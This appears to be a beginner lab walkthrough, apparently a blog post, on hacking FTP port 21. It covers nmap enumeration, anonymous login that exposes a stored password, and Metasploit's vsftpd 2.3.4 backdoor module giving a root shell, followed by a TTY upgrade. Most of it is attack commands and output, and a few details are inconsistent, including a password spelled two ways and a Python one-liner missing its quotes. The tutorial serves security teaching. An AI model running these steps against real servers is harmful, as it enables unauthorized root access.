## What is FTP?



FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host/site). The File Transfer Protocol (FTP) is a fundamental component in the world of hacking. FTP allows for the smooth exchange of files across computer networks. While once widely used, FTPs dated security features have made it an appealing target for ethical hackers.



## Hacking the Port 21: A Practical Approach for Beginners



### Enumeration: Scanning FTP Port Using nmap



Enumeration is a critical phase in the process of hacking Port 21. It involves systematically gathering information about the target FTP server, which is invaluable for identifying potential vulnerabilities and crafting effective attacks. In this section, well explore the techniques and tools that ethical hackers use to enumerate FTP servers on Port 21.



One of the popular tools hackers use to check if Port 21 is open on a target system is called Nmap. Nmap is a versatile network scanning tool that helps identify open ports, services, and more on a target host.



  `





```bash

┌──(root㉿kali)-[/home/kali]

└─# nmap -p21 192.168.11.135                            

Starting Nmap 7.93 ( https://nmap.org ) at 

2023-09-10 09:13 EDT

Nmap scan report for 192.168.11.135

Host is up (0.00099s latency).



PORT   STATE SERVICE

21/tcp open  ftp

MAC Address: 00:0C:29:69:22:33 (VMware)



```

`



In this command snippet:



nmap is the command to run Nmap.-p21 specifies that we are interested in Port 21.192.168.11.135 is the IP address of the target system. When you run this command Nmap scans the target IP address (192.168.11.135) for open ports and reports back with its findings.

### Enumeration: Scanning Version



Now that weve confirmed that Port 21 is open on our target system, its time to dig deeper and gather more information about the FTP server running on that port. This step is essential for ethical hackers as it helps identify the specific versions of software in use, potentially revealing known vulnerabilities. To accomplish this, we can use nmap with the -sV flag. Heres how the command looks:



  `





```bash

┌──(root㉿kali)-[/home/kali]

└─# nmap -sV -p21 192.168.11.135 

Starting Nmap 7.93 ( https://nmap.org ) 

at 2023-09-10 09:29 EDT

Nmap scan report for 192.168.11.135

Host is up (0.00046s latency).



PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 2.3.4

MAC Address: 00:0C:29:69:22:33 (VMware)

Service Info: OS: Unix



```

`-p21 specifies Port 21 for FTP.-sV tells Nmap to perform version detection. which is vsftpd 2.3.4 In the exploitation Section we will use this version to see if any exploit is available to Hack this FTP version

### Enumeration: Running Default nmap Scripts



The enumeration is the important Step of our Penetration Testing and In this section, we continue our enumeration process with a specific focus on running default Nmap scripts. These scripts are a powerful tool in the arsenal of ethical hackers, allowing us to gather valuable information and uncover potential vulnerabilities on the FTP server. The -sC flag in Nmap instructs it to run default scripts against the target host. These scripts are designed to perform a wide range of tasks, from service discovery to vulnerability detection. Take a look at this Nmap scan result used with the -sC :



  `





```bash

└─# nmap -sC -sV -p21 192.168.11.135

Starting Nmap 7.93 ( https://nmap.org ) 

at 2023-09-10 09:45 EDT

Nmap scan report for 192.168.11.135

Host is up (0.00045s latency).



PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 2.3.4

```

`



Interesting, Lets break down the Nmap command and examine what it tells us about our target FTP server.



nmap is the command to run Nmap.-sC tells Nmap to run default scripts against the target host.-sV instructs Nmap to perform version detection.-p21 specifies that we are interested in Port 21 (FTP).192.168.11.135 is the IP address of our target FTP server.



Now, lets take a look at the output:



  `





```bash

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 2.3.4

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to 192.168.11.12x

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      vsFTPd 2.3.4 - secure, fast, stable

|_End of status

|_ftp-anon: Anonymous FTP login allowed (FTP code 230)



```

`



Here, we gain insights into the FTP servers status:



Connected to 192.168.11.12x indicates that our scanning device (192.168.11.128) has successfully connected to the FTP server.Logged in as ftp reveals that a user named “ftp” is currently logged in. This information can be valuable for understanding the authentication setup.vsFTPd 2.3.4 - secure, fast, stable” provides further details about the FTP servers version, describing it as “secure, fast, and stable.” Of particular interest is the line:  `





```bash

|_ftp-anon: Anonymous FTP login allowed (FTP code 230).



```

`



Its very important for an attacker. This line informs us that the FTP server allows anonymous FTP login, which is indicated by FTP code 230. For an attacker, this information can be crucial, as anonymous access might open the door to potential vulnerabilities.



### Exploitation: Anonymous Login



The next step involves leveraging the gathered information to explore potential exploits and security gaps. In this section, we turn our attention to one such point of interest: anonymous login. Our earlier enumeration efforts using Nmap have revealed that the FTP server allows anonymous login, a discovery that piques the interest of ethical hackers. Anonymous login, as the name suggests, provides an entry point without requiring explicit credentials. While this feature can be convenient for users, it can also be a goldmine for attackers if not properly secured. To demonstrate anonymous login we can use as username: anonymous and password: anonymous, well use the following command:



  `





```bash

└─# ftp anonymous@192.168.11.135

Connected to 192.168.11.135.

220 (vsFTPd 2.3.4)

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp>



```

`



Now we have logged in Successfuly, we can launch the ls command to see whats the files on this FTP server.



  `





```bash

ftp> ls 

229 Entering Extended Passive Mode (|||10037|).

150 Here comes the directory listing.

-rw-r--r--    1 0        0              18 Sep 10 14:25 note.txt

-rw-r--r--    1 0        0              66 Sep 10 14:27 private.txt

226 Directory send OK.

ftp>



```

`



we see that we have 2 files, we can run the more command to see what is on these files.



  `





```bash

ftp> more note.txt

FTP server Hacked

ftp> more private.txt

hello dear admin, your credentials is Passwor123, dont share it 

ftp>



```

`



As we can see these output of note.txt and private.txt files, and here we have found another pasword:Password123 on the private.txt file.



### Exploitation: Exploiting the Version



In our earlier discussion of [version scanning](#enumeration-scanning-version), we discovered that the FTP server was running vsFTPd version 2.3.4. Now, our next step is to explore potential exploits that can target this specific version. To facilitate this exploration, well make use of a valuable tool known as searchploit. This tool, provided by exploitdb, empowers us to search for exploits right on our local machine, making the process more efficient and focused. Using that specific version I used:



  `





```bash

└─# searchsploit vsftpd 2.3.4

---------------------------------------

------------

-------------------

---------------- ---------------------------------

 Exploit Title                                                               

          |  Path

------------------------------------------

-------------------------------------------

- ---------------------------------

vsftpd 2.3.4 - Backdoor Command Execution                                         

    | unix/remote/49757.py

vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) 

                               | unix/remote/17491.rb



```

`



Here, we have a list of potential exploits associated with vsFTPd 2.3.4:



vsftpd 2.3.4 - Backdoor Command Execution: This exploit, identified by the path “unix/remote/49757.py,” targets the FTP servers vulnerability, potentially allowing remote attackers to execute arbitrary commands.vsftpd 2.3.4 - Backdoor Command Execution (Metasploit): This is another exploit, found at “unix/remote/17491.rb,” which leverages Metasploit to execute commands on the target server.



Now here i see that an Metasploit Exploit is Avalaible for this version of FTP. I will use Metasploit tool to exploit that. i launched it using msfconsole:



  `





```bash

Metasploit



       =[ metasploit v6.3.27-dev                          ]

+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]

+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]

+ -- --=[ 9 evasion                                       ]

```

`



The first command i will do using Metasploit is the search command to help see any exploit avalaible for my search query:



  `





```bash

msf6 > search vsftpd 2.3.4

Interact with a module by name or index. For example info 0,

 use 0 or use exploit/unix/ftp/vsftpd_234_backdoor



```

`



And here as you can see i found the exploit vsftpd 2.3.4 - Backdoor Command Execution (Metasploit). Now we are going to use it using the use command :



  `





```bash

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

use exploit/unix/ftp/vsftpd_234_backdoor

[*] Using configured payload cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

set rhosts 192.168.11.135

rhosts => 192.168.11.135

msf6 exploit(unix/ftp/vsftpd_234_backdoor) 

> exploit 



[*] 192.168.11.135:21 - Banner: 220 (vsFTPd 2.3.4)

[*] 192.168.11.135:21 - USER: 331 Please specify the password.

[+] 192.168.11.135:21 - Backdoor service has been spawned, handling...

[+] 192.168.11.135:21 - UID: uid=0(root) gid=0(root)

 -> 192.168.11.135:6200) at 2023-09-10 11:21:23 -0400



```

`



Lets dive in our command :



use exploit/unix/ftp/vsftpd_234_backdoor We begin by specifying the exploit we want to use. In this case, we chose the “vsftpd_234_backdoor” exploit for vsFTPd 2.3.4.set rhosts 192.168.11.135 We set the target host (rhosts) to the IP address of the FTP server were testing. This tells the exploit where to attempt the attack.exploit With everything set up, we initiate the exploit.[*] Command shell session 1 opened (192.168.11.128:33417 -> 192.168.11.135:6200) at 2023-09-10 11:21:23 -0400 Tells us the machine has been successfully exploited and we have a session opened.



Having successfully exploited the vsFTPd vulnerability, we have achieved a significant milestone in ethical hacking: gaining root access to the target machine. This level of access grants us the highest privileges, essentially making us the systems administrator.



  `





```bash

[*] Found shell.

[*] Command shell session 1 opened (192.168.11.128:44003 

  -> 192.168.11.135:6200) at 2023-09-10 11:52:35 -0400

```

`

### UPGRADING OUR SHELL TO TTYs



To enhance our level of control over the exploited system, we can upgrade our current shell to a fully interactive TTY (teletypewriter) session. This provides a more responsive and feature-rich terminal experience, making it easier to interact with the system. Heres how you can upgrade your shell to a TTY using Python:



  `





```bash

python -c import pty; pty.spawn("/bin/bash")

root@metasploitable:/#



```

`



Now, you have a fully interactive TTY shell, which allows for more advanced interactions with the target system. This can be particularly useful for performing tasks, exploring the system, and carrying out further ethical hacking activities.
